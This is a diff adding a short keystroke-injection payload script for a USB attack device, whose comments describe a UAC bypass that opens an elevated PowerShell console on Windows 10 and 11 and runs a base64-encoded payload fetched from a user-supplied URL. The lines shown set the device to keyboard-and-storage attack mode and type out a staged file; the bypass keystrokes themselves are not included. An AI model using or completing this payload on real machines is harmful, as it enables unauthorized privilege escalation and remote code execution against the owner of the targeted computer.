@@ -1,0 +1,21 @@
+REM     Title: UrAttaControl
+
+REM     Author: I am Jakoby
+
+REM     Description: This is a UAC bypass payload that will open an elevated powershell console and run any script.
+REM     Reaplce the URL down below with a link to a base64 encoded payload you have. See README.md for more details
+
+REM     Target: Windows 10, 11
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+
+QUACK DELAY 3000
+LED STAGE1
+QUACK ${SWITCH_POSITION}/UrAttaControl.txt
+
